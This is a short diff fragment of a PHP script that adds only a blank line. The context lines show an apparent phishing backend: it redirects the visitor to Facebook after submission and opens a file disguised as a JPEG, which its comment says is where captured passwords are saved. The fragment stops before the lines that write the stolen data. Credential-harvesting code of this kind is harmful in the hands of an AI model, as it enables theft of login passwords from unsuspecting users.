@@ -1,3 +1,4 @@
+
 <?php
 header ('Location: https://facebook.com/me'); //Redirect user.
 $handle = fopen("notinawordlist1337.jpg", "a"); //You can rename the file you want to save the passwords.
